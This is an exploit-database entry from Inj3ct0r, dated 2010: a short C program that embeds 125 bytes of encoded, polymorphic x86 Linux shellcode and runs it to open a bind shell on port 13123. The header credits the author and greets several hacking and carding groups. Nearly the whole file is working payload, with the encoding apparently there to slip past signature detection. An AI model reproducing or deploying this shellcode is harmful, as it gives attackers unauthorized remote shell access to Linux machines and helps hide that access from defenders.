/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : Polymorphic shellcode that bindport to 13123 x86 linux shellcode.
Name   : 125 bytes bind port 13123 x86 linux polymorphic shellcode.
Date   : Sat Jun  17 21:27:03 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
                           mywisdom (devilzc0de.org), loneferret (offensive-security.com)
                           greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/

#include <stdio.h>

char bindport[] = "\xeb\x11\x5e\x31\xc9\xb1\x65\x80\x6c\x0e\xff\x35\x80\xe9\x01"
		  "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x66\xf5\x66\x10\x66\x07"
		  "\x85\x9f\x36\x9f\x37\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xfb"
		  "\x87\x9d\xf0\x37\x68\x78\xbe\x16\x9f\x45\x86\x8b\xbe\x16\x33"
		  "\xf8\xe5\x9b\x02\xb5\x87\x8b\xbe\x16\xe8\x39\xe5\x9b\x02\xb5"
		  "\x87\x87\x8b\xbe\x16\x33\xf8\xe5\x9b\x02\xb5\xbe\xf8\x66\xfe"
		  "\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x76\xe5\x74\x02\xb5\x87"
		  "\x9d\x64\x64\xa8\x9d\x9d\x64\x97\x9e\xa3\xbe\x18\x87\x88\xbe"
		  "\x16\xe5\x40\x02\xb5";

int main(void)
{
	//fprintf(stdout,"Length: %d\n",strlen(bindport));
	(*(void(*)()) bindport)();
}